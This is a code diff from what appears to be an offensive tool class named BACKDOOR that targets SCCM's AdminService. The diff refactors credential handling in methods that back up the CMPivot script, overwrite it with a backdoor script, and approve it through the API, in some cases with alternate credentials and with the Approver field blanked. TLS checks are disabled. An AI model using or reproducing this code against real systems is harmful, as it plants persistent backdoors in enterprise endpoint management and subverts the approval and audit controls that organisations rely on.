@@ -13,13 +13,11 @@ from lib.logger import logger
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 class BACKDOOR:
-    def __init__(self, username, password, target, logs_dir, auser, apassword):
-        self.username = username
-        self.password = password
+    def __init__(self, auth, target, logs_dir, auser_auth):
+        self.auth = auth
         self.target = target
         self.logs_dir = logs_dir
-        self.approve_user = auser
-        self.approve_password = apassword
+        self.auser_auth = auser_auth
         self.backdoor_script = ""
         self.headers = {'Content-Type': 'application/json; odata=verbose'}
 
@@ -38,7 +36,7 @@ class BACKDOOR:
     def backup_cmpivot(self):
         url = f"https://{self.target}/adminservice/v1.0/Script/7DC6B6F1-E7F6-43C1-96E0-E1D16BC25C14/"
         r = requests.get(f"{url}",
-                            auth=HttpNtlmAuth(self.username, self.password),
+                            auth=self.auth,
                             verify=False,
                             headers=self.headers)
         #¯\_(ツ)_/¯
@@ -109,7 +107,7 @@ Do-Delete
 
             url = f"https://{self.target}/AdminService/wmi/SMS_Scripts/7DC6B6F1-E7F6-43C1-96E0-E1D16BC25C14/AdminService.UpdateScript"
             r = requests.post(f"{url}",
-                            auth=HttpNtlmAuth(self.username, self.password),
+                            auth=self.auth,
                             verify=False,
                             headers=self.headers, json=body)
             
@@ -127,25 +125,25 @@ Do-Delete
 
     def approve_cmpivot(self):
         try:
-            if self.approve_user:
-                 logger.debug("[*] Using alternate credentials to approve script.")
-                 username = self.approve_user
-                 password = self.approve_password
-            else:
-                 username= self.username
-                 password = self.password
-            #approve changes
             url = f"https://{self.target}/AdminService/wmi/SMS_Scripts/7DC6B6F1-E7F6-43C1-96E0-E1D16BC25C14/AdminService.UpdateApprovalState"
 
-            body = {"Approver":f"{self.username}",
+            body = {"Approver":" ",
                     "ApprovalState": "3",
                     "Comment": ""
                     }
-
-            r = requests.post(f"{url}",
-                        auth=HttpNtlmAuth(username, password),
+            r = ''
+            if self.auser_auth:
+                 logger.debug("[*] Using alternate credentials to approve script.")
+                 r = requests.post(f"{url}",
+                        auth=self.auser_auth,
                         verify=False,
                         headers=self.headers, json=body)
+            else:
+                 r = requests.post(f"{url}",
+                        auth=self.auth,
+                        verify=False,
+                        headers=self.headers, json=body)
+            #approve changes
             if r.status_code == 201:
                 logger.info("[+] CMPivot script approved.")
                 return
